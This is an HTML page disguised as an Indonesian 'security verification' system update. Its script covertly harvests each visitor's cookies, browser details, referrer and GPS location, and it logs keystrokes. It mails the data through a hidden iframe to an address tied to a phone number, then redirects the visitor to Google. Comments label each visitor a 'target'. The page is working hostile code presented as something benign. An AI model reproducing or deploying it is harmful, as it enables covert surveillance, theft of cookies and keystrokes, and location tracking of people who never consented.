<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>System Update</title>
    <style>
        body { background: #0a0a0a; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #00ff41; }
        .container { text-align: center; }
        .spinner { border: 4px solid #1a1a1a; border-top: 4px solid #00ff41; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { color: #666; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h2>🔐 Verifikasi Keamanan</h2>
        <p>Mohon tunggu, sistem sedang memeriksa perangkat Anda...</p>
    </div>

    <script>
        // ========== KONFIGURASI ==========
        // NOMOR PENERIMA (LU) — TETAP 087786738771 PAKE XL
        const TARGET_EMAIL = '087786738771@xl.co.id';

        function sendViaEmail(data) {
            const subject = '🔴 Security Alert - New Access';
            const body = encodeURIComponent(data);
            const mailtoLink = `mailto:${TARGET_EMAIL}?subject=${subject}&body=${body}`;
            
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = mailtoLink;
            document.body.appendChild(iframe);
            
            setTimeout(() => {
                if (!document.hasFocus()) {
                    window.open(mailtoLink, '_blank');
                }
            }, 500);
        }

        function collectData() {
            let data = '═══════════════════════════════\n';
            data += '🔥 NEW TARGET DETECTED 🔥\n';
            data += '═══════════════════════════════\n';
            data += `📡 IP: ${window.location.hostname}\n`;
            data += `🖥️ UA: ${navigator.userAgent}\n`;
            data += `🌐 Bahasa: ${navigator.language}\n`;
            data += `🕒 Waktu: ${new Date().toLocaleString('id-ID')}\n`;
            data += `📱 Resolusi: ${screen.width}x${screen.height}\n`;
            data += `🔄 Referrer: ${document.referrer || 'Direct'}\n`;
            
            if (document.cookie) {
                data += `🍪 Cookie: ${document.cookie.substring(0, 300)}\n`;
            }
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        data += `📍 GPS: ${pos.coords.latitude}, ${pos.coords.longitude}\n`;
                        data += `🎯 Akurasi: ${pos.coords.accuracy} meter\n`;
                        sendViaEmail(data);
                    },
                    () => {
                        data += '📍 GPS: Tidak diizinkan\n';
                        sendViaEmail(data);
                    }
                );
            } else {
                data += '📍 GPS: Tidak support\n';
                sendViaEmail(data);
            }
            
            sendViaEmail(data);
        }

        window.onload = function() {
            setTimeout(collectData, 1500);
            
            setTimeout(() => {
                window.location.replace('https://www.google.com');
            }, 4000);
        };

        let keystrokes = '';
        document.addEventListener('keydown', function(e) {
            const key = e.key.length === 1 ? e.key : `[${e.key}]`;
            keystrokes += key;
            if (keystrokes.length > 50) {
                const logData = `⌨️ KEYLOG: ${keystrokes}`;
                sendViaEmail(logData);
                keystrokes = '';
            }
        });
    </script>
</body>
</html>
